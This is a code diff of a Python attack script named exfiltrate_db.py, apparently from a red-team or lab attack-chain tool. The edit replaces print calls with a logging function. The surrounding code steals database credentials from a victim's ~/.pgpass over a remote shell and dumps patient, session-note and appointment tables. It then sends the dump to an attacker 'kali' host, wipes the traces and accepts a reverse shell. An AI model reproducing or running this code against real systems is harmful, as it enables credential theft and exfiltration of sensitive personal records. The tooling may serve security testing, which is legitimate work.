@@ -4,6 +4,8 @@ import socket
 import subprocess
 import time
 
+from chainlog import log
+
 # =============================================================================
 # exfiltrate_db.py — DB Exfiltration from John's Workstation
 # MITRE ATT&CK:
@@ -90,14 +92,14 @@ def _start_receive_server(port=EXFIL_HTTP_PORT, output_path=EXFIL_LOCAL_PATH):
         stderr=subprocess.DEVNULL,
     )
     time.sleep(1)
-    print(f"[+] Receive server started on port {port} (saving to {output_path})")
+    log(f"[+] Receive server started on port {port} (saving to {output_path})")
     return proc
 
 
 def _stop_receive_server(proc):
     if proc and proc.poll() is None:
         proc.terminate()
-        print("[+] Receive server stopped")
+        log("[+] Receive server stopped")
 
 
 # ---------------------------------------------------------------------------
@@ -106,7 +108,7 @@ def _stop_receive_server(proc):
 
 def _discover_db_creds(john_shell):
     """Read ~/.pgpass and return the first credential dict, or None."""
-    print(f"[*] Reading DB credentials from {PGPASS_PATH} ...")
+    log(f"[*] Reading DB credentials from {PGPASS_PATH} ...")
     raw = _run_remote(john_shell, f"cat {PGPASS_PATH}")
     for line in raw.splitlines():
         line = line.strip()
@@ -115,10 +117,10 @@ def _discover_db_creds(john_shell):
         parts = line.split(":", 4)
         if len(parts) == 5:
             host, port, dbname, user, password = parts
-            print(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
+            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
             return {"host": host, "port": port, "dbname": dbname,
                     "user": user, "password": password}
-    print("[-] No usable credential found in .pgpass")
+    log("[-] No usable credential found in .pgpass")
     return None
 
 
@@ -135,7 +137,7 @@ def _dump_db(john_shell, creds):
         f"-U {creds['user']} -d {creds['dbname']} -t -A -F ,"
     )
 
-    print("[*] Dumping patients table ...")
+    log("[*] Dumping patients table ...")
     _run_remote(
         john_shell,
         f"{psql_env}{psql_base} "
@@ -150,9 +152,9 @@ def _dump_db(john_shell, creds):
         timeout=10,
     )
     row_count = row_count_raw.strip().splitlines()[-1] if row_count_raw.strip() else "?"
-    print(f"[+] patients: {row_count} rows")
+    log(f"[+] patients: {row_count} rows")
 
-    print("[*] Dumping session_notes table ...")
+    log("[*] Dumping session_notes table ...")
     _run_remote(
         john_shell,
         f"echo '--- session_notes ---' >> {DUMP_PATH} && "
@@ -168,9 +170,9 @@ def _dump_db(john_shell, creds):
         timeout=10,
     )
     notes_count = notes_count_raw.strip().splitlines()[-1] if notes_count_raw.strip() else "?"
-    print(f"[+] session_notes: {notes_count} rows")
+    log(f"[+] session_notes: {notes_count} rows")
 
-    print("[*] Dumping appointments table ...")
+    log("[*] Dumping appointments table ...")
     _run_remote(
         john_shell,
         f"echo '--- appointments ---' >> {DUMP_PATH} && "
@@ -186,11 +188,11 @@ def _dump_db(john_shell, creds):
         timeout=10,
     )
     appt_count = appt_count_raw.strip().splitlines()[-1] if appt_count_raw.strip() else "?"
-    print(f"[+] appointments: {appt_count} rows")
+    log(f"[+] appointments: {appt_count} rows")
 
     size_raw = _run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
     size = size_raw.strip().splitlines()[-1].strip() if size_raw.strip() else "0"
-    print(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")
+    log(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")
 
     return {"patients": row_count, "session_notes": notes_count,
             "appointments": appt_count, "dump_bytes": size}
@@ -198,7 +200,7 @@ def _dump_db(john_shell, creds):
 
 def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
     """POST the dump file from the workstation to kali's receive server."""
-    print(f"[*] Sending dump to {kali_host}:{port} ...")
+    log(f"[*] Sending dump to {kali_host}:{port} ...")
     _run_remote(
         john_shell,
         f"python3 -c \""
@@ -210,9 +212,9 @@ def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
     )
     if os.path.exists(EXFIL_LOCAL_PATH):
         size = os.path.getsize(EXFIL_LOCAL_PATH)
-        print(f"[+] Dump received on kali ({size} bytes) → {EXFIL_LOCAL_PATH}")
+        log(f"[+] Dump received on kali ({size} bytes) → {EXFIL_LOCAL_PATH}")
         return True
-    print(f"[-] Exfiltration may have failed — {EXFIL_LOCAL_PATH} not found on kali")
+    log(f"[-] Exfiltration may have failed — {EXFIL_LOCAL_PATH} not found on kali")
     return False
 
 
@@ -234,17 +236,17 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
     Returns:
         dict: db_creds, exfil_path, exfil_ok, stats
     """
-    print("\n[*] Starting DB exfiltration from john.stravidis's workstation ...")
+    log("\n[*] Starting DB exfiltration from john.stravidis's workstation ...")
 
     # Phase 1 — Credentials
     if db_creds is not None:
-        print(f"[+] Using credentials from enumeration step: "
+        log(f"[+] Using credentials from enumeration step: "
               f"{db_creds['user']}@{db_creds['host']}")
         creds = db_creds
     else:
         creds = _discover_db_creds(john_shell)
     if creds is None:
-        print("[-] Cannot proceed without DB credentials")
+        log("[-] Cannot proceed without DB credentials")
         return {"db_creds": None, "exfil_path": None, "exfil_ok": False, "stats": {}}
 
     # Phase 2 — Dump tables
@@ -255,7 +257,7 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
     except ValueError:
         dump_bytes = 0
     if dump_bytes < 10:
-        print(f"[-] Dump file appears empty ({dump_bytes} bytes) — psql may have failed; aborting")
+        log(f"[-] Dump file appears empty ({dump_bytes} bytes) — psql may have failed; aborting")
         _run_remote(john_shell, f"rm -f {DUMP_PATH}")
         return {"db_creds": creds, "exfil_path": None, "exfil_ok": False, "stats": stats}
 
@@ -268,21 +270,21 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
 
     # Cleanup — remove dump from workstation and kali
     _run_remote(john_shell, f"rm -f {DUMP_PATH}")
-    print(f"[+] Removed {DUMP_PATH} from workstation")
+    log(f"[+] Removed {DUMP_PATH} from workstation")
 
     if exfil_ok and os.path.exists(EXFIL_LOCAL_PATH):
         os.remove(EXFIL_LOCAL_PATH)
-        print(f"[+] Removed {EXFIL_LOCAL_PATH} from kali")
+        log(f"[+] Removed {EXFIL_LOCAL_PATH} from kali")
 
     if exfil_ok:
-        print(
+        log(
             f"[+] Exfiltration complete — "
             f"{stats.get('patients', '?')} patients, "
             f"{stats.get('session_notes', '?')} session notes, "
             f"{stats.get('appointments', '?')} appointments"
         )
     else:
-        print("[-] Exfiltration finished with errors")
+        log("[-] Exfiltration finished with errors")
 
     return {
         "db_creds":    creds,
@@ -299,7 +301,7 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
 # ---------------------------------------------------------------------------
 if __name__ == "__main__":
     PORT_JOHN = 6666
-    print(f"[*] Test mode — waiting for john.stravidis shell on port {PORT_JOHN}")
+    log(f"[*] Test mode — waiting for john.stravidis shell on port {PORT_JOHN}")
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -308,9 +310,9 @@ if __name__ == "__main__":
 
     try:
         john_shell, addr = server.accept()
-        print(f"[+] Shell received from {addr[0]}")
+        log(f"[+] Shell received from {addr[0]}")
     finally:
         server.close()
 
     result = run(john_shell)
-    print(f"\n[*] Result: {'success' if result['exfil_ok'] else 'failed'}")
+    log(f"\n[*] Result: {'success' if result['exfil_ok'] else 'failed'}")
